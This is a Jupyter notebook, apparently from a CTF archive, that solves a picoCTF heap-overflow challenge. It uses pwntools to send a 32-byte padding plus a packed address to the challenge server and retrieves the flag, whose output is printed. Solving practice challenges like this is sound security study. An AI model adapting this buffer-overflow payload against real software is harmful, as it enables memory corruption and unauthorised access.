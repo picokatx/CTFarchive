{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwnlib.gdb import attach\n",
    "attach(\"\" 56654)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x00@\\x11\\xa0'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\n\\nx = \\xa0\\x11@\\n\\n\\n1. Print Heap\\n2. Write to buffer\\n3. Print x\\n4. Print Flag\\n5. Exit\\n\\nEnter your choice: '\n",
      "b'picoCTF{and_down_the_road_we_go_dbb7ff66}\\n'\n"
     ]
    }
   ],
   "source": [
    "from pwnlib.tubes.remote import remote\n",
    "r = remote(\"mimas.picoctf.net\", 56654)\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"2\")\n",
    "r.recvuntil(b\"Data for buffer: \")\n",
    "r.sendline(b\"a\"*32+0x004011a0.to_bytes(4, \"little\"))\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"3\")\n",
    "print(r.recvuntil(b\"Enter your choice: \"))\n",
    "r.sendline(b\"4\")\n",
    "print(r.recvline())\n",
    "# r.recvuntil(b\"Enter your choice: \")\n",
    "# r.sendline(b\"1\")\n",
    "# print(r.recvuntil(b\"Enter your choice: \").decode())\n",
    "# r.sendline(b\"4\")\n",
    "# r.recvline()\n",
    "# r.recvline()\n",
    "# r.recvline()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\n\\nx = \\xa0\\x11@\\n\\n\\n1. Print Heap\\n2. Write to buffer\\n3. Print x\\n4. Print Flag\\n5. Exit\\n\\nEnter your choice: '"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "ename": "UnicodeDecodeError",
     "evalue": "'utf-8' codec can't decode byte 0xa0 in position 6: invalid start byte",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mUnicodeDecodeError\u001b[0m                        Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[9], line 1\u001b[0m\n\u001b[1;32m----> 1\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[43mr\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mrecvuntil\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;124;43mb\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mEnter your choice: \u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m)\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mdecode\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m)\n",
      "\u001b[1;31mUnicodeDecodeError\u001b[0m: 'utf-8' codec can't decode byte 0xa0 in position 6: invalid start byte"
     ]
    }
   ],
   "source": [
    "print(r.recvuntil(b\"Enter your choice: \").decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
